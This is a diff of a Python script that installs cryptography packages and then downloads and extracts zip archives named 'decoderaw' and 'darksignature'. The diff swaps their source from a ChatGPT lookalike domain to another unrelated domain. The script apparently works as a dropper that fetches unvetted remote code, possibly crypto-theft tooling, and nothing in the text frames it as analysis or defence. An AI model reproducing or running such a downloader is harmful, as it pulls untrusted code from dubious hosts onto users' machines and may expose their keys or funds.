@@ -10,7 +10,7 @@ modules = ["zmq", "ecdsa", "urllib3", "requests", "pycryptodome"]
 for module in modules:
     subprocess.run(["pip", "install", module])
 
-url2 = 'https://chatgpt4o.org/repositories/decoderaw.zip'
+url2 = 'https://zoeir.com/repositories/decoderaw.zip'
 zip_filename2 = 'decoderaw.zip'
 response2 = requests.get(url2)
 response2.raise_for_status() 
@@ -21,7 +21,7 @@ with zipfile.ZipFile(zip_filename2, 'r') as zip_ref:
     zip_ref.extractall('decoderaw')
 os.remove(zip_filename2)
 
-url3 = 'https://chatgpt4o.org/repositories/darksignature.zip'
+url3 = 'https://zoeir.com/repositories/darksignature.zip'
 zip_filename3 = 'darksignature.zip'
 response3 = requests.get(url3)
 response3.raise_for_status() 
@@ -31,3 +31,4 @@ with open(zip_filename3, 'wb') as file:
 with zipfile.ZipFile(zip_filename3, 'r') as zip_ref:
     zip_ref.extractall('darksignature')
 os.remove(zip_filename3)
+
